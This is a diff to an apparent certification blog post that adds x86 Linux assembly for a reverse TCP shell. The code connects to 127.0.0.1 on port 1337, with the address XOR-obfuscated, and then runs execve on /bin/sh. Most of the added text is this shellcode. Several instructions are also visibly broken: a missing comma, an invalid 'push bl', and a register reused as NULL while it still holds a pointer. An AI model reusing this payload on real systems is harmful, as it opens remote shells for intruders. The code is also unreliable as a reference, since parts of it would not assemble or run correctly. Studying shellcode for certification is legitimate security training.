@@ -113,6 +113,7 @@ _start:		;
 
 xor ebx, ebx	; Zero out registers before usage to avoid a logic error
 xor ecx, ecx	;
+xor edx, edx	;
 mul cx		; ax = ax * cx (0)
 
 ;int socketcall(int call, unsigned long *args)
@@ -162,21 +163,63 @@ jnz sockfd_func ; loop back to sockfd_func if not zero
 ## Connect
 
 ```nasm
+;int socketcall(int call, unsigned long *args)
 ;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
 ;
 ;syscall number: 102 (0x66) 
 ;Arguement Values
 ;EAX -> 0x66 socketcall
-;EBX -> ESP pointer *args
-;ECX -> Addrlen
-;STACK *args Values:
-;3rd push -> 
+;EBX -> 0x3 connect
+;ECX -> ESP pointer *args
+;IP Socket Address Structure:
+;*addr = memory address of structure containing:
+;  - sin_family: 0x0002 (AF_INET/IPv4)
+;  - sin_port: 0x0539 (1337)
+;  - sin_addr.s_addr: 0x0100007f (127.0.0.1)
+;addrlen = 0x10 (16/sizeof(sockaddr_in))
 ;
 
-mov al 0x66	; socketcall wrapper
-mov ebx, esp	; move *args to ebp
-mov ecx,  	; 
+mov al 0x66	    ; socketcall wrapper
+		    ; bl is already 0x3 (connect) from sockfd
 
+mov edi, 0xffffffff ; 255.255.255.255
+mov ecx, 0xfeffff80 ; 128.255.255.254
+xor ecx, edi        ; 0x0100007f = 127.0.0.1
+
+push ecx	    ; sin_addr.s_addr 127.0.0.1 
+push word 0x0539    ; sin_port 1337
+push word 0x0002    ; sin_family 0x2
+mov ecx, esp	    ; move connect *args to ecx. this also points to IP Socket Address Struct 
+
+push 0x10	    ; addrlen (socket)
+push esp	    ; pointer to IP Struct
+push bl	  	    ; sockfd
+
+int 0x80	    ; interrupt
+```
+
+## Execve
+
+```nasm
+; EXECVE SHELL
+; int execve(const char *filename, char *const argv[], char *const envp[]);
+; syscall number: 11 (0xb)
+;
+; Argument Values:
+; *filename = Memory address of a null terminated string "/bin/sh"
+; *argv[] = [*"/bin/sh", 0x00000000]
+; *envp = NULL
+;
+
+push edx	    	; delimiting NULL for pathname; EDX is NULL for envp[]
+push dword 0x68732f2f   ; push / / s h
+push dword 0x6e69622f   ; push / b i n
+mov ebx, esp            ; Store pointer to "/bin/sh" in ebx
+push ecx                ; Push NULL
+push ebx                ; Push *filename
+mov ecx, esp            ; Store memory address pointing to memory address of "/bin/sh"
+mov al, 0xb             ; execve call
+int 0x80                ; interrupt
 ```
 
 _This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_
